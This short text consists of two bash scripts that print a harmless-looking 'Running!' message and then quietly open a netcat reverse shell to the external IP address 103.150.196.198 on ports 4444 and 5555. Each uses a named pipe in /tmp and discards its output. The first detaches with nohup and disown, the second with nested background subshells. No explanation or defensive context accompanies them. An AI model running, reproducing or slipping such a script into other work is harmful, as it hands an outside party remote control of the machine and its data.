#!/bin/bash
echo Running!
nohup sh -c 'mkfifo /tmp/f; nc 103.150.196.198 4444 < /tmp/f | sh > /tmp/f 2>&1; rm /tmp/f' </dev/null >/dev/null 2>&1 & disown
exit 0

#!/bin/bash
echo Running!
(
  (
    mkfifo /tmp/f
    #!/bin/bash
    nc 103.150.196.198 5555 < /tmp/f | sh > /tmp/f 2>&1
    rm /tmp/f
  ) </dev/null >/dev/null 2>&1 &
) &
exit 0
